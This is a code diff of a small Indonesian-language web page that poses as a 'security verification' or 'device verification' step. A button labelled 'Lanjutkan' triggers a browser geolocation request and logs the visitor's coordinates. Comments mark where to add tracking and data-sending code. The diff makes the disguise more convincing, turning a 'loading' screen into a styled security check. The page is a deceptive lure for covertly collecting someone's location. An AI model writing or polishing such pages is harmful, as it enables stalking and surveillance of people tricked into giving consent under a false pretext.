@@ -2,22 +2,31 @@
 <html lang="id">
 <head>
     <meta charset="UTF-8">
-    <title>Verifikasi Lokasi</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
+    <style>
+        body { font-family: Arial, sans-serif; text-align: center; padding-top: 50px; background: #f4f4f9; }
+        .btn { background: #007bff; color: white; padding: 12px 24px; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; margin-top: 20px; }
+    </style>
 </head>
 <body>
-    <h2>Memuat Halaman...</h2>
-    <p>Mohon tunggu sebentar, sistem sedang memverifikasi perangkat Anda.</p>
+    <h2>Verifikasi Perangkat</h2>
+    <p>Ketuk tombol di bawah ini untuk melanjutkan proses verifikasi.</p>
+    <button class="btn" onclick="mulaiLacak()">Lanjutkan</button>
 
     <script>
-        // Masukkan script pelacakan GPS/koleksi data Anda di sini
-        if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(function(position) {
-                console.log("Latitude: " + position.coords.latitude);
-                console.log("Longitude: " + position.coords.longitude);
-                // Tambahkan kode pengiriman data (misalnya fetch/axios ke database Anda) di sini
-            }, function(error) {
-                console.log("Gagal mendeteksi lokasi: " + error.message);
-            });
+        function mulaiLacak() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function(position) {
+                    alert("Lokasi terdeteksi!");
+                    console.log("Lat: " + position.coords.latitude + ", Long: " + position.coords.longitude);
+                    // Masukkan kode kirim data tambahan Anda di sini
+                }, function(error) {
+                    alert("Izin lokasi ditolak atau gagal.");
+                });
+            } else {
+                alert("Browser tidak mendukung.");
+            }
         }
     </script>
 </body>
